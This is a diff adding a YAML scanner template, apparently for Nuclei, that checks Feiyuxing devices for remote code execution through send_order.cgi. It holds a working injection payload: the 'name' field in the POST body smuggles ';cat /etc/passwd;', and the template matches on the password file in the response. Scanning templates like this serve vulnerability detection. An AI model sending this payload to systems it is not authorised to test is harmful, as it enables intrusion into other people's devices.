@@ -1,0 +1,27 @@
+id: feiyuxing-send-order-cgi-rce
+info:
+  name: Feiyuxing send_order.cgi Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+http:
+  - method: POST
+    path:
+      - "/send_order.cgi?parameter=operation"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      {"opid":"1","name":";cat /etc/passwd;","type":"rest"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:/bin"
+      - type: word
+        part: body
+        words:
+          - "{\"type\":1,\"msg\":\"ok\"}"
